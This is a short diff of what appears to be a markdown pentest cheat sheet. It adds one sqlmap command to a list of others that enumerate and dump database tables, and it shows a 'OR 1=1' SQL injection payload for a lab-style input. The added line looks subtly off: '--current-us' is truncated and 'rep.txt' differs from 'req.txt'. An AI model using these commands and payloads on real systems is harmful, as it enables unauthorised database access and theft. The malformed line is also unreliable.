@@ -2228,6 +2228,7 @@ Content-Type: application/x-php`
 - `sqlmap -r req.txt -D NameDataBase --tables`
 - `sqlmap -r req.txt -D NameDataBase -T tableName --columns`
 - `sqlmap -r req.txt -D NameDataBase -T tableName --dump-all`
+- `sqlmap -r rep.txt -D blood --current-us`
 
 > medium selectpicker
 - `value="1 OR 1=1 #”`
